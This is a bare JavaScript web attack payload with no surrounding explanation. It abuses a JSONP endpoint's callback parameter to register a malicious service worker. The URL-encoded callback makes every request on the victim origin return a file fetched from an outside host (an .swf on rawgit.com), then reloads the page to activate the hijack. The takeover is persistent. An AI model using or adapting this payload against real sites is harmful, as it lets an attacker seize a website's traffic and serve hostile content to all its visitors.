if ('serviceWorker' in navigator) navigator.serviceWorker.register('/token.jsonp?v=1&callback=this.addEventListener(%22install%22%2cfunction(a)%7ba.waitUntil(caches.open(%22v%22).then(function(a)%7breturn+a.add(%22%2f%22)%7d))%7d)%2cthis.addEventListener(%22fetch%22%2ca%3d%3e%7ba.respondWith(fetch(%22%2f%2frawgit.com%2fKawaHttp%2ftest1%2fmaster%2fe.swf%22))%7d)%3b');
location.reload();
